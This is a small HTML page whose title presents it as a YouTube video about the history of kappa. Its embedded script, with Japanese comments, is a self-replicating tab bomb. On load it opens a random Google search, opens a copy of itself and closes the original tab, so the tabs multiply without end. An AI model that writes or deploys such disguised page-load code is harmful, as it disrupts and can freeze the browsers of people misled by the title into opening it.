<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>河童の歴史-Youtube</title>
</head>
<body>

<script>
// 検索ワード一覧
const words = [
    "猫",
    "犬",
    "C++",
    "Python",
    "Rust",
    "HTML",
    "JavaScript",
    "Linux",
    "宇宙",
    "AI"
];

// ランダム検索ワード
const word = words[Math.floor(Math.random() * words.length)];

// Google検索URL
const searchUrl =
    "https://www.google.com/search?q=" +
    encodeURIComponent(word);

// 自分自身のURL
const selfUrl = location.href;

// 1. 検索タブを開く
window.open(searchUrl, "_blank");

// 2. 自分自身をコピーして開く
window.open(selfUrl, "_blank");

// 3. 現在のタブを閉じる
setTimeout(() => {
    window.close();
}, 500);

</script>

</body>
</html>
